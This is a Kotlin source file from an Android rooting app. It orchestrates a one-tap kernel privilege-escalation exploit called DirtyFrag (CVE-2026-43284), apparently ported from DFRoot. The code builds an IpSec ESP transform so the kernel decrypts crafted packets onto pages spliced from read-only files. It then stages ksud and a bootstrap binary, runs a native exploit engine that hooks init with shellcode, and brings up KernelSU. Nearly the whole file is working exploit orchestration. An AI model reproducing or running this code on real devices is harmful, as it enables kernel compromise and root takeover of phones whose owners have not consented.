package com.agnessu.yakayn.data.dirtyfrag

import android.annotation.SuppressLint
import android.content.Context
import android.net.IpSecAlgorithm
import android.net.IpSecManager
import android.net.IpSecTransform
import android.os.Build
import android.os.SystemClock
import androidx.annotation.RequiresApi
import com.agnessu.yakayn.BuildConfig
import com.agnessu.yakayn.Natives
import df.root.ExploitRunner
import df.root.IReporter
import java.io.File
import java.net.DatagramSocket
import java.net.InetAddress
import java.security.SecureRandom
import kotlinx.coroutines.CancellationException
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.launch

/**
 * One-tap DirtyFrag (CVE-2026-43284) root orchestrator, a faithful port of
 * diabl0w/DFRoot. The native engine is a PIE executable (libdfroot.so) run as a
 * subprocess — no JNI. This repository sets up the IpSecManager AES-CBC ESP
 * transform the native primitive relies on, writes the prefs that bootstrap
 * reads, stages both `ksud` and `bootstrap` into device-protected storage, then
 * execs the engine and streams its stdout into the log.
 */
class DirtyFragRepository(private val context: Context) {

    private val _state = MutableStateFlow(DirtyFragUiState())
    val state: StateFlow<DirtyFragUiState> = _state.asStateFlow()

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var installJob: Job? = null

    val snapshot: DirtyFragDeviceSnapshot by lazy { DirtyFragDeviceSnapshot.current() }

    /** Device-protected data dir of the *running* package: `/data/user_de/0/<pkg>/`. */
    private val deDataDir: File
        get() = context.createDeviceProtectedStorageContext().filesDir.parentFile

    init {
        scope.launch {
            // Same signal Home uses for "installed": the KernelSU driver answers
            // and recognises this manager. Do NOT probe a root shell here — the
            // manager process only gets the driver fd when it is (re)started by
            // the kernel's zygote hook, so a stale process cannot see it anyway.
            val active = isAgnesSuActive()
            val hooked = !active && hookedThisBoot()
            _state.value = DirtyFragUiState(
                phase = when {
                    active -> DirtyFragInstallPhase.Installed
                    hooked -> DirtyFragInstallPhase.Failed
                    else -> DirtyFragInstallPhase.Ready
                },
                log = buildString {
                    append("kernel: ${snapshot.kernelVersionFull}")
                    when {
                        active -> append("\n[*] AgnesSU already active, no need to run DirtyFrag")
                        hooked -> append("\n[!] init was already hooked on this boot; reboot required before running DirtyFrag")
                    }
                },
                rebootRequired = hooked,
            )
        }
    }

    @SuppressLint("NewApi")
    fun install() {
        if (installJob?.isActive == true) return
        installJob = scope.launch {
            _state.value = DirtyFragUiState(phase = DirtyFragInstallPhase.Checking, log = "")
            try {
                require(snapshot.isAarch64) { "aarch64 required" }
                require(snapshot.isApiSupported) { "Android 10+ required" }
                val reporter = IReporter { appendLog(it) }
                if (isAgnesSuActive()) {
                    _state.value = _state.value.copy(rebootRequired = false)
                    setPhase(DirtyFragInstallPhase.Installed, "[*] AgnesSU already active")
                    return@launch
                }

                // The libc++ shellcode creates /dev/df as an O_EXCL mutex the
                // first time it runs. While it exists the init hook cannot be
                // installed again this boot, so retrying would only time out or
                // report a false success (the upstream engine's own guard).
                if (hookedThisBoot()) {
                    _state.value = _state.value.copy(rebootRequired = true)
                    throw IllegalStateException(
                        "init was already hooked on this boot but AgnesSU is not active; " +
                            "reboot the device, then run DirtyFrag again",
                    )
                }

                setPhase(DirtyFragInstallPhase.Exploiting, "[*] Running DirtyFrag (CVE-2026-43284)")
                val code = runExploit(reporter)
                if (code == 4) {
                    // /dev/df appeared between the pre-check and the engine start
                    // (e.g. a concurrent attempt); the retry needs a reboot.
                    _state.value = _state.value.copy(rebootRequired = true)
                    throw IllegalStateException("init was already hooked on this boot; reboot the device before running DirtyFrag again")
                }
                if (code != 0 && isAgnesSuActive()) {
                    // The engine failed late, but the previous stage already
                    // brought KernelSU up; do not report a failure then.
                    setPhase(DirtyFragInstallPhase.Installed, "[*] AgnesSU active")
                    return@launch
                }
                require(code == 0) { "DirtyFrag returned $code" }

                // Exit code 0 only means ksud accepted the late-load request:
                // ksud daemonizes immediately, so the module can still be
                // loading (or fail later). Wait for the driver to answer before
                // claiming success. On success ksud force-stops this app, so this
                // poll usually dies with the process and the restarted app's
                // init() is the authority; a surviving process that never sees
                // the driver has genuinely failed.
                appendLog("[*] late-load dispatched, waiting for AgnesSU...")
                if (awaitAgnesSuActive()) {
                    _state.value = _state.value.copy(rebootRequired = false)
                    setPhase(DirtyFragInstallPhase.Installed, "[*] AgnesSU active")
                    appendLog("[*] Root complete")
                } else {
                    _state.value = _state.value.copy(rebootRequired = hookedThisBoot())
                    throw IllegalStateException(
                        "late-load did not bring AgnesSU up in time; check the log above. " +
                            "If it actually succeeded, restart this app to re-check; otherwise reboot before retrying.",
                    )
                }
            } catch (error: Throwable) {
                if (error is CancellationException) throw error
                if (hookedThisBoot()) {
                    _state.value = _state.value.copy(rebootRequired = true)
                }
                appendLog("[-] ${error.message ?: error.javaClass.simpleName}")
                setPhase(DirtyFragInstallPhase.Failed, "[*] Root failed")
            }
        }
    }

    /**
     * Re-check the live state, e.g. when the screen is shown again after
     * late-load restarted the app. Never interferes with a running install.
     */
    fun refresh() {
        if (installJob?.isActive == true) return
        scope.launch {
            if (isAgnesSuActive()) {
                _state.value = _state.value.copy(rebootRequired = false)
                if (_state.value.phase != DirtyFragInstallPhase.Installed) {
                    setPhase(DirtyFragInstallPhase.Installed, "[*] AgnesSU active")
                }
            } else {
                val hooked = hookedThisBoot()
                _state.value = _state.value.copy(
                    rebootRequired = hooked,
                    phase = if (_state.value.phase == DirtyFragInstallPhase.Installed) {
                        DirtyFragInstallPhase.Ready
                    } else {
                        _state.value.phase
                    },
                )
            }
        }
    }

    @RequiresApi(Build.VERSION_CODES.Q)
    private fun runExploit(reporter: IReporter): Int {
        reportDeviceInfo(reporter)
        writePrefs()

        val ipsec = context.getSystemService(Context.IPSEC_SERVICE) as IpSecManager

        // NAT-T UDP encapsulation socket: the kernel decrypts crafted ESP
        // packets in-place on pages the native engine spliced from read-only
        // files. encapPort is where the native sender connects to.
        val encapSock = ipsec.openUdpEncapsulationSocket()
        val encapPort = encapSock.port

        // Source port for the native sender. The engine opens its own UDP socket
        // and bind()s it to this port, so only reserve a free ephemeral port and
        // release it immediately — exactly how DFRoot's ExploitRunner does it.
        // Keeping it bound would make the native bind() fail with EADDRINUSE.
        val senderPort = DatagramSocket().use { it.localPort }

        // IPv4 loopback explicitly: openUdpEncapsulationSocket() is IPv4 and the
        // destination address family must match it. InetAddress
        // .getLoopbackAddress() returns ::1 (IPv6), which makes
        // buildTransportModeTransform throw "UDP encapsulation socket and
        // destination address families must match".
        val loopback = InetAddress.getByName("127.0.0.1")
        val spi = ipsec.allocateSecurityParameterIndex(loopback)

        // AES-256-CBC only. DFRoot's ESP layout (SPI + seq + IV + 16-byte block)
        // carries no authentication ICV, so no HMAC key or setAuthentication.
        val aesKey = ByteArray(32)
        SecureRandom().nextBytes(aesKey)

        // setIpv4Encapsulation applies the NAT-T transform to the encapsulation
        // socket in both directions, so no separate applyTransportModeTransform
        // call is needed (matches DFRoot's ExploitRunner).
        val transform = IpSecTransform.Builder(context)
            .setEncryption(IpSecAlgorithm(IpSecAlgorithm.CRYPT_AES_CBC, aesKey))
            .setIpv4Encapsulation(encapSock, senderPort)
            .buildTransportModeTransform(loopback, spi)

        try {
            stageKsud(reporter)
            stageBootstrap(reporter)
            val bin = File(context.applicationInfo.nativeLibraryDir, "libdfroot.so")
            require(bin.isFile) { "libdfroot.so missing from native library dir" }
            // Resolve the bootstrap path at runtime: a spoofed/renamed build runs
            // under a randomized applicationId, so the ko must exec *this* package's
            // staged bootstrap, not a hardcoded com.agnessu.yakayn path.
            val bootstrapPath = File(deDataDir, "bootstrap").absolutePath
            return ExploitRunner.run(
                bin = bin,
                encapPort = encapPort,
                senderPort = senderPort,
                spi = spi.spi,
                aesKey = aesKey,
                bootstrapPath = bootstrapPath,
                onLine = { reporter.report(it) },
            )
        } finally {
            runCatching { transform.close() }
            runCatching { spi.close() }
            runCatching { encapSock.close() }
        }
    }

    /** KernelSU is up and recognises this manager — the same signal Home uses
     *  for "installed". */
    private fun isAgnesSuActive(): Boolean =
        runCatching { Natives.isManager }.getOrDefault(false)

    /** /dev/df is the shellcode's O_EXCL mutex: present once init was hooked. */
    private fun hookedThisBoot(): Boolean = File("/dev/df").exists()

    /** Poll the (cheap) driver check; ksud daemonizes, so readiness is delayed. */
    private suspend fun awaitAgnesSuActive(timeoutMs: Long = 60_000): Boolean {
        val start = SystemClock.elapsedRealtime()
        while (SystemClock.elapsedRealtime() - start < timeoutMs) {
            if (isAgnesSuActive()) return true
            delay(1_000)
        }
        return isAgnesSuActive()
    }

    /** Same device banner DFRoot's ExploitRunner prints before attacking. */
    private fun reportDeviceInfo(reporter: IReporter) {
        reporter.report("* app version: ${BuildConfig.VERSION_NAME}\n")
        reporter.report("* manufacturer: ${snapshot.manufacturer}\n")
        reporter.report("* model: ${snapshot.model}\n")
        reporter.report("* android version: ${Build.VERSION.RELEASE}\n")
        reporter.report("* security patch: ${Build.VERSION.SECURITY_PATCH}\n")
        reporter.report("* kernel version: ${snapshot.kernelVersionFull}\n\n")
    }

    /**
     * bootstrap reads these from device-protected storage before it late-loads
     * ksud. `disable_modules` stays false on a fresh root — there are no modules
     * yet, and a missing /data/adb/modules would otherwise make bootstrap abort
     * with /dev/dfme1 before launching the daemon.
     */
    private fun writePrefs() {
        val prefs = context.createDeviceProtectedStorageContext()
            .getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        prefs.edit()
            .putString(PREF_SU_MANAGER, context.packageName)
            .putBoolean(PREF_SOFT_REBOOT, false)
            .putBoolean(PREF_DISABLE_MODULES, false)
            .commit()
    }

    /**
     * Copy AgnesSU's bundled ksud (libksud.so) to `<deDataDir>/ksud` — the path
     * bootstrap late-loads (derived from /proc/self/exe at runtime).
     */
    private fun stageKsud(reporter: IReporter) {
        stageNative(context.applicationInfo.nativeLibraryDir, "libksud.so", "ksud", reporter)
    }

    /**
     * Copy the DFRoot post-root stage (libbootstrap.so) to `<deDataDir>/bootstrap`
     * — the path the ko executes. --bootstrap-path patches it into the shellcode
     * as the ko's `bootstrap=` module parameter, so the LKM execs this package's
     * copy even on spoofed builds. This stage is what sets partitions read-only
     * before ksud starts; skipping it is the Samsung reboot regression.
     */
    private fun stageBootstrap(reporter: IReporter) {
        stageNative(context.applicationInfo.nativeLibraryDir, "libbootstrap.so", "bootstrap", reporter)
    }

    private fun stageNative(
        nativeLibDir: String,
        srcName: String,
        destName: String,
        reporter: IReporter,
    ) {
        val src = File(nativeLibDir, srcName)
        require(src.isFile) { "$srcName missing from native library dir" }
        val target = File(deDataDir, destName)
        if (target.isFile && target.length() == src.length()) {
            reporter.report("[*] $destName already staged")
            return
        }
        src.inputStream().use { input ->
            target.outputStream().use { output -> input.copyTo(output) }
        }
        target.setExecutable(true, false)
        reporter.report("[*] $destName staged -> ${target.absolutePath}")
    }

    private fun setPhase(phase: DirtyFragInstallPhase, message: String) {
        _state.value = _state.value.copy(phase = phase)
        appendLog(message)
    }

    private fun appendLog(line: String) {
        val cleanLine = stripAnsi(line).trim()
        if (cleanLine.isBlank()) return
        _state.value = _state.value.copy(
            log = (_state.value.log + "\n" + cleanLine).trim(),
        )
    }

    companion object {
        private const val PREFS_NAME = "dirtyfrag"
        private const val PREF_SU_MANAGER = "su_manager"
        private const val PREF_SOFT_REBOOT = "soft_reboot"
        private const val PREF_DISABLE_MODULES = "disable_modules"
        private val ANSI_ESCAPE = Regex("\u001B\\[[0-?]*[ -/]*[@-~]")

        private fun stripAnsi(value: String): String =
            ANSI_ESCAPE.replace(value, "").replace("\r", "")
    }
}
